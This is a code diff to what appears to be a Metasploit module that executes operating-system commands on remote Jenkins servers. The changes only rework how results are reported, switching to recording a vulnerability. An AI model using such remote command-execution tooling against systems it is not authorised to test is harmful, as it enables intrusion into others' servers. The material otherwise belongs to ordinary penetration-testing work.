@@ -72,7 +72,6 @@ class Metasploit3 < Msf::Auxiliary
       output = res.scan(/<pre>(.*?)<\/pre>/m)
       if output.to_s.include? "java.lang.Runtime.exec" or output.to_s.include? "not recognized"
         print_error("#{rhost}:#{rport} - Invalid command provided to the OS.")
-        report_data(ip, rport, "The command #{command} was not valid on the remote host.")
       elsif !output.empty? and !output.to_s.include? "java.lang.Runtime.exec"
         output = output[1][0][12..-1].gsub("err&amp;gt;", "").strip
         print_good("#{rhost}:#{rport}: The command executed successfully on #{ip}. Output:")
@@ -80,16 +79,16 @@ class Metasploit3 < Msf::Auxiliary
         output.split("\n").each{|line| print_good("#{rhost}:#{rport}: #{line.strip}")}
       else
         print_error("#{rhost}:#{rport} - An unknown error has occured when running the command.")
-        report_data(ip, rport, "The command #{command} did not execute successfully.")
       end
     end
   end
 
   def report_data(ip, rport, result)
-    report_service(
+    report_vuln(
       :host   => ip,
       :port   => datastore['RPORT'],
       :proto  => 'tcp',
+      :name   => 'jenkins',
       :info   => result
     )
   end
